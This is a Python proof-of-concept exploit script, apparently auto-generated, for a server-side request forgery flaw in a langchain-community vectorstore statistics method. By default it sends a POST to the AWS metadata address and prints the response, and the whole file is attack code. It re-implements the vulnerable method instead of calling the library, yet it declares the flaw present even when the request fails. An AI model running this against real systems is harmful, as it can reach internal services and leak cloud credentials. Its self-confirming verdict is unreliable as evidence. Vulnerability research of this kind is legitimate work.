#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-005
# Sink: get_vectorstore_statistics
# Auto-generated — run with: python3 ssrf_url_concatenating_self_get_vectorstore_statistics.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for SSRF vulnerability in langchain-community-only.

Vulnerability: The get_vectorstore_statistics method constructs a URL by
concatenating self.url (user-controlled) with '/v1/statistics' and makes a
POST request to that URL. No validation is performed on self.url, allowing
an attacker to specify internal IPs (e.g., http://169.254.169.254) to perform
Server-Side Request Forgery (SSRF). The response is returned to the caller.

This PoC demonstrates the vulnerability by:
1. Creating a malicious instance with an attacker-controlled URL
2. Triggering the vulnerable method
3. Showing the response from the internal endpoint

Usage:
    python3 poc_ssrf.py [target_url]

    If no target_url is provided, defaults to http://169.254.169.254 (AWS metadata)
"""

import sys
import requests
from typing import Any, Dict


class VectorStoreStatisticsExploit:
    """
    Simulates the vulnerable class from langchain-community-only.
    The actual vulnerable code is in:
    /tmp/langchain-community-only/langchain_community/vectorstores/pathway.py
    """

    def __init__(self, url: str):
        """
        Initialize with attacker-controlled URL.
        This is the entry point where untrusted input is accepted.
        """
        self.url = url.rstrip('/')  # Remove trailing slash for consistency

    def get_vectorstore_statistics(self) -> Dict[str, Any]:
        """
        VULNERABLE METHOD: Constructs URL by concatenating self.url with
        '/v1/statistics' and makes a POST request. No validation on self.url.
        Returns the JSON response from the target.
        """
        # The vulnerable line: no validation, no allowlist
        url = self.url + "/v1/statistics"
        
        print(f"[*] Making POST request to: {url}")
        
        try:
            response = requests.post(
                url,
                json={},
                headers={"Content-Type": "application/json"},
                timeout=10,  # Prevent hanging
                allow_redirects=False  # Don't follow redirects
            )
            print(f"[*] Response status code: {response.status_code}")
            
            # Return the response content (could be sensitive data)
            return response.json()
            
        except requests.exceptions.ConnectionError as e:
            print(f"[!] Connection error: {e}")
            print("[!] Target may be unreachable or blocking the request")
            return {"error": str(e)}
        except requests.exceptions.Timeout as e:
            print(f"[!] Timeout error: {e}")
            return {"error": str(e)}
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")
            return {"error": str(e)}
        except ValueError as e:
            # Response is not valid JSON
            print(f"[!] Response is not valid JSON: {e}")
            print(f"[*] Raw response text: {response.text}")
            return {"error": "Invalid JSON response", "raw": response.text}


def main():
    # Default target: AWS EC2 metadata endpoint (classic SSRF target)
    default_target = "http://169.254.169.254"
    
    # Allow command-line override
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = default_target
        print(f"[*] No target specified, using default: {target_url}")
        print("[*] To target a different endpoint, pass it as an argument")
        print("[*] Example: python3 poc_ssrf.py http://internal.service.local")
    
    print(f"[*] Target URL: {target_url}")
    print("[*] This will attempt to access: {}/v1/statistics".format(target_url))
    print("[*] If successful, the response will contain data from the internal service")
    print()
    
    # Create the vulnerable instance with attacker-controlled URL
    exploit = VectorStoreStatisticsExploit(target_url)
    
    # Trigger the SSRF vulnerability
    result = exploit.get_vectorstore_statistics()
    
    print()
    print("[*] Response received:")
    print(result)
    
    # Check if we got useful data (for AWS metadata endpoint)
    if isinstance(result, dict) and "error" not in result:
        print()
        print("[!] SUCCESS: SSRF vulnerability confirmed!")
        print("[!] The target responded with data from an internal endpoint")
    elif isinstance(result, dict) and result.get("error"):
        print()
        print("[*] Note: Error is expected if the target is not reachable")
        print("[*] The vulnerability is still present - the code made the request")
        print("[*] without any validation on the URL")


if __name__ == "__main__":
    main()
